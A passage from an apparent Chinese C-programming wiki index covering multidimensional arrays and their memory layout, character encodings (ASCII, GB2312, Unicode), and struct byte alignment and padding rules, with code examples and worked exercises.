7, 8, 9, 10, 11, 12&#125;; //编译通过int arr[3][4] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;; //其余补0 可以省略第一维的值 12345int arr[][4] = &#123;1,2,3,4,5,6,7,8,9,10,11,12&#125;;\t//按4个一组，所以第一维编译器能确定是3 int arr[3][] = &#123;1,2,3,4,5,6,7,8,9,10&#125;; //编译器无法确定几个一组，编译不通过 int arr[3][4] = &#123;1,2,3,4,5,6,7,8,9,10&#125;; //按4个一组，其余补0，维编译器能确定是3 内存存储 多维数组的内存存储和一维数组一样，都是连续存储。 一维数组方式的反汇编二维数组方式的反汇编12345678#include &quot;stdafx.h&quot;int main()&#123;\tint arr[3 * 4] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 7, 6, 5&#125;;\treturn 0;&#125; 12345678910111213#include &quot;stdafx.h&quot;int main()&#123; int arr[3][4]= &#123; &#123;1,2,3,4&#125;, &#123;5,6,7,8&#125;, &#123;9,7,6,5&#125;, &#125;;\treturn 0;&#125; 只是多维数组的写法，让程序员可以更方便的找到想使用的数据。 比如:一年有12个月，每个月都有一个平均气温，存储5年的数据。 程序员想使用第一年第9个月的数据就使用arr[0][8]；想使用第二年第8个月的数据就使用arr[1][7]。 但在内存中多维数组是连续存储的，编译器是怎么找到的？对于arr[0][8]，编译器是这样找到的arr[0*12+8]；对于arr[1][7]，编译器是这样找到的arr[1*12+7]，跳过第一年，第一年有12个，所以是1*12。 1234567int arr[5][12] = &#123; &#123;1, 2, 1, 4, 5, 6, 7, 8, 9, 1, 2, 3&#125;, // 0 &#123;1, 2, 1, 4, 5, 6, 7, 8, 9, 1, 2, 3&#125;, // 1 &#123;1, 2, 1, 4, 5, 6, 7, 8, 9, 1, 2, 3&#125;, // 2 &#123;1, 2, 1, 4, 5, 6, 7, 8, 9, 1, 2, 3&#125;, // 3 &#123;1, 2, 1, 4, 5, 6, 7, 8, 9, 1, 2, 3&#125;, // 4&#125;; 同理，假设一共有5个班，每个班4个组，每组3个人 1234567int arr[5][4][3] = &#123; &#123;&#123;1, 2, 3&#125;, &#123;4, 5, 6&#125;, &#123;7, 8, 9&#125;, &#123;11, 12, 13&#125;&#125;, // 0 &#123;&#123;11, 12, 13&#125;, &#123;14, 15, 16&#125;, &#123;17, 18, 19&#125;, &#123;111, 112, 113&#125;&#125;, // 1 &#123;&#123;21, 22, 23&#125;, &#123;24, 25, 26&#125;, &#123;27, 28, 29&#125;, &#123;211, 212, 213&#125;&#125;, // 2 &#123;&#123;31, 32, 33&#125;, &#123;34, 35, 36&#125;, &#123;37, 38, 39&#125;, &#123;311, 312, 313&#125;&#125;, // 3 &#123;&#123;41, 42, 43&#125;, &#123;44, 45, 46&#125;, &#123;47, 48, 49&#125;, &#123;411, 412, 413&#125;&#125; // 4&#125;; 需求 程序员视角 编译器如何计算 获取第2个班级、第3组、第2个人的年龄 arr[1][2][1] arr[1*4*3+2*3+1]。备注：1个班级里有4个组*3个人；1个组里有3个人 获取第4个班级、第4组、第3个人的年龄 arr[3][3][2] arr[3*4*3+3*3+1] 综上，对于一个形式这样的多维数组int arr[a][b][c][d][e]，编译器在寻找arr[2][3][4][2][2]是这样算的：arr[2bcde+3cde+4de+2e+2]"},{"title":"字符和字符串","path":"/wiki/C/字符和字符串.html","content":"前言 学习数据类型要从宽度、格式、作用域这三个方面进行学习。 比如int类型，决定了宽度是4字节，按补码格式存储； float类型，决定了宽度是4字节，IEEE编码格式 12int a = 123; //补码int float b = 123.4F; //IEEE编码 那这种形式是什么情况？ 1int c = &#x27;A&#x27;; 字符 所有数据到内存中最终都会变成0和1，那字符是怎么表示的？ 答案：查表，这张表记录了数值和符号之间的映射关系。 ASCII表 American Standard Code for Information Interchange美国标准信息交换代码。 一开始受限于成本，8位太昂贵，标准ASCII表用的7位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符，共128个字符。我们将字符A赋值给变量时，编译器会去这张表中寻找大写的A，查到A对应10进制为65，转为16进制就是0x41，然后将这个二进制数存入变量中。 值得注意的是，在这张表中最多也就是占用一个字节的宽度。用int来存储int c = 'A';显得有些浪费，所以通常情况下用char来作为数据类型，比如char c = 'A'。有些书称变量c为字符类型变量，这会让初学者认为char类型变量就是用来存储字符的，实际上在我们眼中char就是整型变量。 编译器通过查表将’A’对应的数值赋给变量c，变量c存的就是编号。 二进制数 十进制 十六进制 字符 0100 0001 65 41 A 0100 0010 66 42 B 0100 0011 67 43 C 0100 0100 68 44 D 0100 0101 69 45 E 0100 0110 70 46 F 0100 0111 71 47 G 0100 1000 72 48 H 0100 1001 73 49 I 0100 1010 74 4A J 0100 1011 75 4B K 0100 1100 76 4C L 0100 1101 77 4D M 0100 1110 78 4E N 0100 1111 79 4F O 0101 0000 80 50 P 0101 0001 81 51 Q 0101 0010 82 52 R 0101 0011 83 53 S 0101 0100 84 54 T 0101 0101 85 55 U 0101 0110 86 56 V 0101 0111 87 57 W 0101 1000 88 58 X 0101 1001 89 59 Y 0101 1010 90 5A Z 上述表中有一些转义字符 1 拓展ASCII表(Extended ASCII) 由于标准ASClI码字符集字符数目有限，在实际应用中往往无法满足要求。来到早期小型计算机发展时，8位字节的标准得以巩固。为此，国际标准化组织又将ASCII码字符集扩充为8位代码及ASCII码的扩充。这样，ASCII码的字符集可以扩充128个字符，也就是使用8位扩展ASCl码能为256个字符提供编码“这些扩充字符的编码均为高位为1的8位代码（即十进制数128一255 )，称为扩展ASClI码。扩展ASCII码所增加的字符包括加框文字、圆圈和其他图形符号。 标准ASCII表最高位为0，扩展ASCII表补充的128个字符最高位为1。 GB2312或GB2312-80 即使8位全用上，也只能表示256个字符。像中文这样的象形文字的基本用字可不只256个。因为扩展ASCII表额外的128个字符中文中很少用到，于是利用了这拓展的128个字符作文章。用两个字节来表示一个汉字。规定：小于127的字符意义与原来相同，当两个大于127的字符连在一起时，就表示一个汉字。用区和位来定位，这就是GB2312或GB2312-80，也叫汉字国标码。 两个字节表示一个汉字，每个字节在80-FF范围内。 因为一个汉字由两个字节表示，如果这样写，是不行的，会发生截断： 1char c=&#x27;逆&#x27;; 原本C4 E6表示“逆”这个字，现在截断了，高位舍弃，保留低位。 要这样写： 1char* c=&#x27;逆&#x27;; Unicode GB2312或GB2312-80的弊端： 两种编码可能使用相同的数字代表两个不同的符号。 比如在A国家的编码标准下，C4 E6代表α，在B国家的编码标准下，C4 E6代表β。A国和B国对相同数字的定义方式不一样。 相同的符号，却是不同的数字来代表。 比如在A国家的编码标准下，α查表得到是C4 E6，在B国家的编码标准下，α查表得到是CF F2。 为了解决上述弊端，Unicode诞生了。16位，可以表示65536个字符。对世界上所有书面语言常用的字符和象形文字来说足够了，还可以包括一批数学、符号以及装饰标志的集合。 字符串 以’\\0’作为结束标志。 练习 有一个字符串是这样的：china中国verygood天朝nice,里面既含有中文又含义英文，请编写一个函数，能截取任意长度的字符串n(n&lt;=总长度) fn(5) = china fn(6) = china中 fn(8) = china中国v tips：字母用的是ASCII表，1个字母占1个字节，中文用的GB2312，1个汉字占2个字节。在这种字符和字节数不统一的情况下如何处理？ 答案汉字每个字节最高位是1，ASCII表最高位是0。代码运行截图12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;string.h&gt;void fn(const char *str, int n)&#123; int byte_count = 0; for (int len = 0; len &lt; n; len++) &#123; // 最高位为0，ASCII字符，字节数加1 if ((str[byte_count] &amp; 0x80) == 0) &#123; byte_count++; &#125; // 最高位为1，GB2312字符，字节数加2 else &#123; byte_count += 2; &#125; &#125; // byte_count指示了我们要拷贝的字节数量 char result[100]; strncpy(result, str, byte_count); result[byte_count] = &#x27;\\0&#x27;; printf(&quot;%s &quot;, result);&#125;int main()&#123; char str[] = &quot;china中国verygood天朝nice&quot;; for (int i = 0; i &lt;= 21; i++) &#123; fn(str, i); &#125; return 0;&#125;"},{"title":"字节对齐","path":"/wiki/C/字节对齐.html","content":"sizeof运算符 sizeof运算符以字节为单位返回运算对象的大小。运算对象可以是具体的数据对象（如，变量名）或类型。如果运算对象是类型（如，float），则必须用圆括号将其括起来。 C语言规定，sizeof返回size_t类型的值。这是一个无符号整数类型，size_t是语言定义的标准类型。在C头文件中，用了typedef将size_t作为unsigned int或unsigned long的别名，在使用size_t类型时，编译器根据不同的系统替换标准类型。 C99做了进一步调整，新增了%zd转换说明用于printf()显示size_t类型的值。如果系统不支持%zd，可使用%u或%lu代替%zd。 基本类型数组结构体12345678910printf(&quot;%d &quot;,sizeof(char)); printf(&quot;%d &quot;,sizeof(short int));\t//短整型，short的完整写法printf(&quot;%d &quot;,sizeof(int)); printf(&quot;%d &quot;,sizeof(long int));\tprintf(&quot;%d &quot;,sizeof(__int64));\tprintf(&quot;%d &quot;,sizeof(float));\tprintf(&quot;%d &quot;,sizeof(double)); int x = 10;\tprintf(&quot;%d &quot;,sizeof(x)); 1234567891011char arr1[10] = &#123;0&#125;;\tshort arr2[10] = &#123;0&#125;;\tint arr3[10] = &#123;0&#125;; printf(&quot;%d &quot;,sizeof(arr1));\tprintf(&quot;%d &quot;,sizeof(arr2));\tprintf(&quot;%d &quot;,sizeof(arr3)); printf(&quot;%d &quot;,sizeof(arr1[10]));\t//打印arr1数组第10个元素的大小，虽然越界了，还是能打印printf(&quot;%d &quot;,sizeof(arr2[10]));\tprintf(&quot;%d &quot;,sizeof(arr3[10])); 123456789101112131415161718192021222324252627struct S1&#123; char a; int b; char c;&#125;;struct S2&#123; int a; char b; char c;&#125;;int main(int argc, char *argv[])&#123; S1 x; S2 y; printf(&quot;%d &quot;, sizeof(x)); printf(&quot;%d &quot;, sizeof(y)); printf(&quot;%d &quot;, sizeof(S1)); printf(&quot;%d &quot;, sizeof(S2)); return 0;&#125; 字节对齐 现代计算机的内存是以byte为基本单元，这让程序员误以为数据可以存放在任何起始地址，但实际上并不是这样。 The chips in your computer are very good at working with fixed-size numbers. This is the reason why the basic integer types in C grow in powers of two (char = 1 byte, short = 2 bytes, int = 4 bytes, long = 8 bytes). But it further turns out that the computer can only work efficiently if these fixed-size numbers are aligned at specific addresses in memory. 参考：Lecture 5: Structures and Alignment 简单点说，因为计算机用二进制数，对2的幂次方的数据处理起来更高效。如果我们将这些固定大小的变量类型（fixed-size numbers）放在特定的地址上，而不是按顺序一个接着一个存放，这样计算机处理起来会更高效。 实际上，每个对象（Object）除了有大小（size）之外，还有对齐要求（alignment requirement）的属性，The alignment means that all objects of this type must start at an address divisible by the alignment. In other words, an integer with size 4 and alignment 4 must always start at an address divisible by 4. 字节对齐，实际上是变量起始内存地址的对齐，编译器并不让object连续地紧挨在一起，而是会安排每个pbject在内存中的排布，让每个object都满足它的alignment requirement（对齐于一个能被它的alignment整除的地址上，即adress % alignment=0adress\\ \\% \\ alignment=0adress % alignment=0），这是一种以空间换取时间的策略。两个objec之间的空隙，编译器会填充一些无效的字节（padding）。 参考：字节对齐与填充（Data Alignment and Padding In C） 为什么需要内存对齐？ 非对齐的内存访问（unaligned memory access），其影响因处理器体系结构而异。 一些处理器根本就不支持非对齐的内存访问，一旦访问就抛出异常 增加对非对齐地址访问的能力，会增加电路复杂性。增加budget。这些电路设计原本可以用于处理更多的数据或设计为其他功能。 一些处理器能处理非对齐内存访问的情况，但这需要额外的访存次数，会使性能下降 一些处理器支持非对齐内存访问，而且没有明显的性能损失 一般而言，数据对齐的目的，是为了减少cpu访存次数，提高系统性能。比如32位的Intel处理器通过总线访问(包括读和写)内存数据。每个总线周期从偶地址开始访问32位内存数据，内存数据以字节为单位存放。如果一个32位的数据没有存放在4字节整除的内存地址处，那么处理器就需要2个总线周期对其进行访问，显然访问效率下降很多。 内存的设计特性大概看一下就好了，深入下去要了解内存的硬件组成内存为什么要字节对齐？ - 知乎内存读写是并行的，而不是串行的。这里先提一下访问一块内存具体的过程，假如我去访问[00~31]32bit大小内存，意味着需要在内存条上找32个存储单元，找32个bit内存，那整个过程是依次串行去找的吗？先找第一个，然后找第二个，…，直到找到32个？如果去访问64bit的话那就要串行收集64次！串行找太慢了！！实际上，内存读写是并行的拿出你的内存条，你会发现内存条上有存储芯片颗粒，或为8个，或为16个或4个。一般单个颗粒称为一个chip，而一个chip有多个bank，比如8个，cpu会把所有在线的内存，每一个颗粒都选取一样数目的bit，集合成一个cpu位宽，比如64bit，可能由你内存条上8个颗粒每一个都提供8bit。所以，在 [00~63] 或 [63~127]，这样单个成为cpu位宽的成为单次读写访问的数据，就是按64位对齐的！无法更改！访问某对齐地址上64个bit，可能由8个内存chip，每一个chip的8个bank各自提供一个bit，在同一时间快速就集齐64bit！并行这种思维在ic里是很常见的。所以内存的设计特性决定了，需要进行内存对齐。cache命中实际上，cpu取数据，会先到cache中读取，如果miss，才从内存读取。如果不对齐，一小块cache line没法将需要的数存进去，又浪费了cache拓展阅读：不同内存访问粒度的情况下，CPU是如何访问的参考：Data alignment: Straighten up and fly rightProcessor's memory access granularity本小节能回答以下疑问：如果我将一个int类型变量的起始地址放在地址1处（奇数地址，没有对齐），然后让CPU从地址1开始读取，不也就能通过一次访问就读取到了数据吗？内存以byte作为基本单元，这让程序员习惯性地认为不同类型的数据可以随意存储在内存的任意地址上（如下图），但事实并非如此。这是因为cpu的硬件原因，cpu访问内存不是以字节块（chunks）为大小作为单位进行访问，而是以2、4、8、16甚至32字节为单位访问内存。这个大小称为内存访问粒度（memory access granularity）。在cpu此硬件特性上，假设编译器在编译时不作数据对齐的工作，而允许数据任意存放。我们做这么一个实验：储存方式1：假设一个4字节的数据存储在起始地址0上储存方式2：假设一个4字节的数据存储在起始地址1上在不同的内存访问粒度（memory access granularity）下，观察分别从地址0和地址1读取4字节到寄存器中所需要的内存访问次数以及耗费时间。Single-byte memory access granularityDouble-byte memory access granularityQuad-byte memory access granularity从地址0开始依次读取4字节到寄存器中从地址1开始依次读取4字节到寄存器中Single-byte memory access granularity当内存访问粒度为1字节时，cpu从内存读取数据的行为如下：储存方式1：依次读取地址0，地址1，地址2，地址3的数据。储存方式2：依次读取地址1，地址2，地址3，地址4的数据。在该内存访问粒度下，无论数据是以储存方式1还是储存方式2存储，cpu访问内存的次数一样。Double-byte memory access granularity当内存访问粒度为2字节时，从内存读取数据的行为如下：储存方式1：从地址0开始读取2字节数据-&gt;从地址2开始读取2字节数据储存方式2：从地址0开始读取2字节数据-&gt;从地址2开始读取2字节数据-&gt;从地址3开始读取2字节数据，丢弃地址0和地址5的数据，拼接地址1到地址4一共4字节数据到寄存器中。⚠️在该内存访问粒度下，cpu只会从能被2整除的地址开始读取，比如从地址0开始读取，从地址2开始读取…，从地址2n开始读取…。对于储存方式1，内存访问粒度为2字节会比内存访问粒度为1字节少一半的内存访问次数。因为每次内存访问会产生固定的开销，减少了次数就是提高了性能。然而，对于储存方式2，由于这4字节数据不能很好地落在cpu的访问边界上，cpu作了额外的访问次数。Quad-byte memory access granularity当内存访问粒度为4字节时，从内存读取数据的行为如下：储存方式1：从地址0开始读取4字节数据。储存方式2：从地址0开始读取4字节数据-&gt;从地址4开始读取4字节数据，丢弃地址0和地址5、6、7的数据，拼接地址1到地址4一共4字节数据到寄存器中。⚠️在该内存访问粒度下，cpu只会从能被4整除的地址开始读取，比如从地址0开始读取，从地址2开始读取…，从地址4n开始读取…。在该内存访问粒度下，储存方式2仍比存储方式1多了额外的内存访问次数。综上，理论上，增大cpu每次的内存访问粒度，就可以减少访问次数，也就提高了性能。但如果不对数据存放的地址进行对齐，还随意存在非对齐地址上，增大的内存访问粒度这一特点反而会变成短板，通过增加内存访问粒度带来的性能提升会被抵消甚至变成劣势。how processors handle unaligned memory acess在前面的实验中，像地址1这样的地址就被称为非对齐地址（unaligned address）。A processor has to perform some tricks when instructed to access an unaligned address.回到内存访问粒度为4字节的实验中，当cpu访问地址1时，采取的tricks如下：The processor needs to read the first chunk of the unaligned address and shift out the “unwanted” bytes from the first chunk. Then it needs to read the second chunk of the unaligned address and shift out some of its information. Finally, the two are merged together for placement in the register. It’s a lot of work.但是，要知道，一些处理器是无法处理访问非线性地址的情况！比如，original 68000处理器，它是一个内存访问粒度为2的处理器，当它访问非对齐地址时，由于缺少处理这种情况下的电路，会直接抛出异常，如果是Mac OS系统，会让用户重启机器。后面新出的680x0系列处理器，比如68020，就解除了这种限制，使得处理器能够处理访问非对齐地址的情况。但为了能处理非对齐地址，需要增加处理器的晶体管（transistors）数量，这会增加成本（transistor budget），而这些预算本来可以用来加快处理器其他部分的工作速度或新增其他功能。 MIPS处理器直接就不支持非对齐内存地址的访问，把这些预算投入到处理速度上。PowerPC用的是混合方法，为非对齐的32位整数提供硬件支持。虽然访问非对齐仍会对性能造成影响，但这种影响被降低了很多。但另一方面，现代PowerPC处理器缺乏对未对齐64位浮点数访问的硬件支持。当要求从内存中加载未对齐的浮点数时，现代PowerPC处理器会抛出异常，让操作系统在软件中执行对齐工作，在软件中执行对齐会比在硬件中执行慢得多。 对齐规则 规则一：内置类型的对齐值 在默认情况下（即不指定对齐要求），对于内置类型，比如char，short，int，指针等等，其对齐值=（sizeof的结果），又称自然对齐。 一个内置类型变量的宽度为n个字节，则该变量的起始地址是n的整数倍。即存放起始地址%n=0。This applies independently of whether the object is inside a collection, such as a struct or array, or not. Type Size Address restriction char 1 No restriction short 2 Multiple of 2 int 4 Multiple of 4 long int 4 Multiple of 4 __int64 8 Multiple of 8 float 4 Multiple of 4 double 8 Multiple of 8 12345678910111213141516171819202122232425//后缀为.c文件，.cpp全局变量从高地址到低地址分配，没细究#include &lt;stdio.h&gt;char a;short b;int c;long d;__int64 e;float f;double g;int main(int argc, char *argv[])&#123; a=1; b=2; c=3; d=4; e=5; f=6; g=7; return 0;&#125; 应该是编译器优化了变量的地址布局，所以这里没法看出padding。算了，用这个例子可以看出变量的起始地址都是变量宽度的整数倍，是对齐的。 规则二：结构体或类的对齐值 结构体变量的起始地址是所有成员中最宽的数据类型的整数倍。假设一个结构体有成员1，成员2…，则该结构体变量的存放起始地址%max&#123;成员1的宽度，成员2的宽度，...&#125;=0。 有数组的话，是看数组的基本数据类型，而不是整个数组的长度。很好记，假如结构体有char [7]成员，不可能按7对齐吧。 如果一个结构里有结构体成员，则该结构体成员的对齐值为内部最宽数据类型的宽度。 1234567891011121314151617struct B&#123; char a; int b; double c; //最宽的数据类型&#125;;struct A&#123; short c; struct B d; //这个成员以8字节进行对齐 int e;&#125;;//还会影响到的：//结构体A的整个大小要是8的倍数，因为最宽的成员为B，是8//这是后面规则三的内容 .c文件下不允许声明空结构体，.cpp文件可以声明空结构体和空类，空结构体和空类大小为1。 123456789struct A&#123;&#125;;class B&#123; &#125;; 12345678910111213141516171819202122232425#include &quot;stdafx.h&quot;struct Test_1&#123; char a; int b;&#125;v_1;struct Test_2&#123; char a; __int64 b;&#125;v_2;int main(int argc, char *argv[])&#123; v_1.a=1; v_1.b=2; v_2.a=3; v_2.b=4; return 0;&#125; 上述例子可以看出结构体变量的起始地址是所有成员中最宽的数据类型的整数倍。Test_1结构体变量的对齐值是4，Test_2结构体变量的对齐值是8。 另外，在结构体中的变量也遵守规则一，即结构体中各个变量的起始地址也要对齐自身的数据类型。 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;struct Test&#123; char a; int b;&#125;v_1;struct Test2&#123; char a; __int64 b;&#125;v_2;int main(int argc, char *argv[])&#123; v_1.a=1; v_1.b=2; v_2.a=3; v_2.b=4; printf(&quot;%-30s%-10s%-20s%-10s &quot;, &quot;结构体成员的数据类型&quot;, &quot;size&quot;, &quot;成员起始address&quot;, &quot;成员起始地址能否被size整除&quot;); printf(&quot;%-30s%-10lu%-20p%-10s &quot;, &quot;char&quot;, sizeof(v_1.a), &amp;(v_1.a), ((size_t)&amp;(v_1.a) % sizeof(v_1.a)) == 0 ? &quot;能&quot; : &quot;不能&quot;); printf(&quot;%-30s%-10lu%-20p%-10s &quot;, &quot;int&quot;, sizeof(v_1.b), &amp;(v_1.b), ((size_t)&amp;(v_1.b) % sizeof(v_1.b)) == 0 ? &quot;能&quot; : &quot;不能&quot;); printf(&quot; &quot;); printf(&quot;%-30s%-10lu%-20p%-10s &quot;, &quot;char&quot;, sizeof(v_2.a), &amp;(v_2.a), ((size_t)&amp;(v_2.a) % sizeof(v_2.a)) == 0 ? &quot;能&quot; : &quot;不能&quot;); printf(&quot;%-30s%-10lu%-20p%-10s &quot;, &quot;__int64&quot;, sizeof(v_2.b), &amp;(v_2.b), ((size_t)&amp;(v_2.b) % sizeof(v_2.b)) == 0 ? &quot;能&quot; : &quot;不能&quot;); return 0;&#125; 看Test结构体，char类型从00427E30开始，占1个字节。然后编译器考虑放int类型的成员，但此时00427E31这个地址不能%4=0，于是填充3个字节，直到00427E34处，放置int类型的成员。 Test2结构体同理。 规则三：整个结构体的大小 整个结构体的大小需要是内部成员中最宽的数据类型的整数倍，即sizeof（结构体）%max&#123;成员1的宽度，成员2的宽度，...&#125;=0。 有数组的话，是看数组的基本数据类型，而不是整个数组的长度。很好记，假如结构体有char [7]成员，不可能按7对齐吧。 有如下结构体，按照我们上面讲述的规则一和规则二来分析，只能分析出该结构体占9个字节，但实际上占12个字节。 1234567struct A&#123; char a; //1+3 int b; //4 char c; //1 //1 + 3??&#125;; 这是因为要满足规则三。之所以编译器在后面补充3个字节，是为了实现结构数组的存取效率。试想如果定义一个结构A的数组，那么第一个结构起始地址是0没有问题，但是第二个结构呢？按照数组的定义，数组中所有元素都紧挨着。如果我们不把结构体大小补充为4的整数倍，那么下一个结构的起始地址将是0x00009，这显然不能满足结构体起始地址的对齐。因此要把结构体补充成有效对齐大小的整数倍。 其实对于char/short/int/float/double等已有类型的自身对齐值也是基于数组考虑的，只是因为这些类型的长度已知，所以他们的自身对齐值也就已知。 当内存空间比较宝贵，或有其他条件要求时，可修改编译器的对齐值。 VC下，在Project-&gt;setting，C选项卡，Category的Code Generation，在Struct Member Alignment中修改。 在代码中使用#pragma pack(value)指定对齐值。 使用伪指令#pragma pack(value)：C编译器将按照value个字节对齐，value需是2的幂次方，可设定为1、2、4、8，VC编译器默认是8。 使用伪指令#pragma pack()： 取消自定义字节对齐方式。 12345678#pragma pack(1)struct A&#123; char a; int b; char c; &#125;;#pragma pack() ⚠️#pragma pack(value)影响的是结构体中成员的对齐方式，而不影响结构体起始地址的对齐方式。 规则四：加入指定对齐值后的变化 由于手动指定了程序的对齐值。当计算结构体中成员的对齐值时，#pragma pack(value)的对齐值会与规则一冲突，此时，有两种选择，要么是程序指定的对齐值，要么是内置类型的对齐值，此时取两者最小值，即min&#123;指定对齐值，内置类型的对齐值&#125;。 由于手动指定了程序的对齐值。当计算整个结构体大小的对齐值时，#pragma pack(value)的对齐值会与规则二冲突，此时，有两种选择，要么是程序指定的对齐值，要么是结构体成员中最宽的数据类型的整数倍。此时取两者之间最小值，即min&#123;指定对齐值，结构体成员中最宽的数据类型的整数倍&#125;。 因为是取min，所以如果#pragma pack(value)的指定对齐值比结构体成员内置类型的对齐值和结构体成员中最宽的数据类型都大的话，实际上也就没起作用。 例 1234567891011121314151617181920212223242526#pragma pack(1)struct A&#123; char a; int b; char c; &#125;;#pragma pack()#pragma pack(2)struct B&#123; char a; int b; char c; &#125;;#pragma pack()#pragma pack(8)struct C&#123; char a; int b; char c; &#125;;#pragma pack() 代码输出各成员偏移12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#define OFFSET(st, field) (size_t)&amp;(((st*)0)-&gt;field)#pragma pack(1)struct A&#123; char a; int b; char c; &#125;;#pragma pack()#pragma pack(2)struct B&#123; char a; int b; char c; &#125;;#pragma pack()#pragma pack(8)struct C&#123; char a; int b; char c; &#125;;#pragma pack()int main() &#123; printf(&quot;Size of struct A: %lu a-%lu, b-%lu, c-%lu &quot;, sizeof(struct A), OFFSET(struct A, a), OFFSET(struct A, b), OFFSET(struct A, c)); printf(&quot;Size of struct B: %lu a-%lu, b-%lu, c-%lu &quot;, sizeof(struct B), OFFSET(struct B, a), OFFSET(struct B, b), OFFSET(struct B, c)); printf(&quot;Size of struct C: %lu a-%lu, b-%lu, c-%lu &quot;, sizeof(struct C), OFFSET(struct C, a), OFFSET(struct C, b), OFFSET(struct C, c)); return 0;&#125;123450 //常量0(st *)0 //转为st指针类型((st *)0)-&gt;field //取st结构体中的field成员的值&amp; (((st *)0)-&gt;field) //取field成员的地址，类型为field成员的类型加上一个*号；这是一个值(size_t) &amp; (((st *)0)-&gt;field) //将field成员地址这个值转为size_t类型用OFFSET宏来获取每个成员在结构体中的偏移量。工作原理：首先将地址0转换为结构体类型的指针然后获取结构体成员的地址由于这个地址是相对于结构体起始地址，所以这个地址就是成员的偏移地址。 对齐规则小结 上面的概念利于给初学者进行讲解和理解，但如果从整个结构体起始地址、成员地址、尾部成员填充的思考路线来看，以下总结的对齐准则更合适。 结构体变量的首地址能够被其最宽基本类型成员的大小所整除； 结构体每个成员相对结构体首地址的偏移量(offset)都是min{指定对齐值，成员自身对齐值}min\\{指定对齐值，成员自身对齐值\\}min{指定对齐值，成员自身对齐值}大小的整数倍。如有需要，编译器会在成员之间加上填充字节（internal padding）； 结构体的总大小为min{指定对齐值，结构体中最宽基本类型成员大小的对齐值}min\\{指定对齐值，结构体中最宽基本类型成员大小的对齐值\\}min{指定对齐值，结构体中最宽基本类型成员大小的对齐值}大小的整数倍。如有需要，编译器会在最末一个成员之后加上填充字节（trailing padding）。 对以上三条规则的说明如下： 第一条：编译器在给结构体开辟空间时，首先找到结构体中最宽的基本数据类型，然后寻找内存地址能被该基本数据类型所整除的位置，作为结构体的首地址。将这个最宽的基本数据类型的大小作为上面介绍的对齐模数。 第二条：为结构体的一个成员开辟空间之前，编译器首先检查预开辟空间的首地址相对于结构体首地址的偏移是否是min{指定对齐值，成员自身对齐值}min\\{指定对齐值，成员自身对齐值\\}min{指定对齐值，成员自身对齐值}大小的整数倍。若是，则直接存放本成员，反之，则在本成员和上一个成员之间填充一定的字节，以达到整数倍的要求，也就是将预开辟空间的首地址后移几个字节。 第三条：给最后一个成员分配完地址后，还需要检查目前整个结构体的大小是否是min{指定对齐值，结构体中最宽基本类型成员大小的对齐值}min\\{指定对齐值，结构体中最宽基本类型成员大小的对齐值\\}min{指定对齐值，结构体中最宽基本类型成员大小的对齐值}大小的整数倍，如果不是，编译器会在最末一个成员之后继续填充字节。 补充： 结构体成员有数组，是看数组的基本类型，而不是整个数组的长度 结构体A中有结构体B成员，则结构体B的对齐值为结构体B中最宽的成员的对齐值 空结构体和空类的大小为1 例题 根据上面小结的三条对齐规则完成下面的例题。 这里我出的题，直接就按自然对齐来出题；如果有指定对齐值，一样的，第二条、第三条就取min。 例1 123456struct A&#123; char a; int b; char c;&#125;; 答案答案：123456struct A&#123; char a; //1 + 3 int b; //4 char c; //1 + 3&#125;; //总大小121234567891011121314151617#include &lt;stdio.h&gt;#define OFFSET(st, field) (size_t)&amp;(((st*)0)-&gt;field)struct A&#123; char a; int b; char c;&#125;;int main() &#123; printf(&quot;Size of struct A: %lu a-%lu, b-%lu, c-%lu &quot;, sizeof(struct A), OFFSET(struct A, a), OFFSET(struct A, b), OFFSET(struct A, c)); return 0;&#125;分析过程：结构体中成员的最宽数据类型是int类型，4字节。第一条：结构体起始地址能被4整除。第二条：第1个成员a，分配1字节。第2个成员b，相对结构体起始地址偏移是1，不能被4整除，要在成员a后面填充3个字节。第3个成员c，相对结构体起始地址偏移是8，能被1整除，不填充。第三条：目前整个结构体大小是4+4+1=9，不能整除4，要在尾部填充3字节。实际分析的话，直接写就行了。不用画图，这里画图只是为了直观展示。 例2 12345678struct A&#123; char a; short b; char c; int d; char e[6];&#125;; 答案数组还是看char类型，而不是数组总长度答案：12345678struct A&#123; char a; //1 + 1 short b; //2 char c; //1 + 3 int d; //4 char e[6]; //6 + 2&#125;; //总大小：201234567891011121314151617181920212223#include &lt;stdio.h&gt;#define OFFSET(st, field) (size_t) &amp; (((st *)0)-&gt;field)struct A&#123; char a; //1 + 1 short b; //2 char c; //1 + 3 int d; //4 char e[6]; //6 + 2&#125;; //总大小：20int main()&#123; printf(&quot;Size of struct A: %lu a-%lu, b-%lu, c-%lu, d-%lu e[0]-%lu, e[1]-%lu, e[2]-%lu e[3]-%lu, e[4]-%lu, e[5]-%lu &quot;, sizeof(struct A), OFFSET(struct A, a), OFFSET(struct A, b), OFFSET(struct A, c), OFFSET(struct A, d), OFFSET(struct A, e[0]), OFFSET(struct A, e[1]), OFFSET(struct A, e[2]), OFFSET(struct A, e[3]), OFFSET(struct A, e[4]), OFFSET(struct A, e[5]), OFFSET(struct A, e[6])); return 0;&#125; 例3 12345678910111213struct B&#123; char a; int b; double c;&#125;;struct A&#123; short c; struct B d; int e;&#125;; 答案12345678910111213struct B&#123; char a; //1 + 3 int b; //4 double c; //8&#125;; //总大小：16struct A&#123; short c; //2 + 6 struct B d; //16 int e; //4 + 4&#125;; //总大小：32结构体B成员和总大小的分析略。下面分析结构体A：成员c，占2个字节。成员d，要占16个字节。对齐值是结构体B中最宽的成员的宽度，是double类型，对齐值是8。所以要在成员c后面补6个字节成员e，目前偏移整个结构体起始地址2+6+16=24，能被4整除，不填充，放成员e。尾部填充：整个结构体大小需要是成员中最宽的数据类型的倍数，最宽的是d，为8。目前是2+6+16+4=28，不能被8整除，需要填充4字节。为什么不是16？不能把struct看成一个整体，要这样看：1234567891011struct A&#123; short c; //2+6 struct B //对齐于8 &#123; char a; //1 + 3 int b; //4 double c; //8 &#125;d; //总大小：16 int e; //4 + 8 or 16??? &#125;;而且这样展开后，也就明白了，成员d的对齐值为什么要是成员中最宽的数据类型的倍数。因为对齐于最宽，其他成员肯定就对齐了。所以总大小为32字节。12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#define 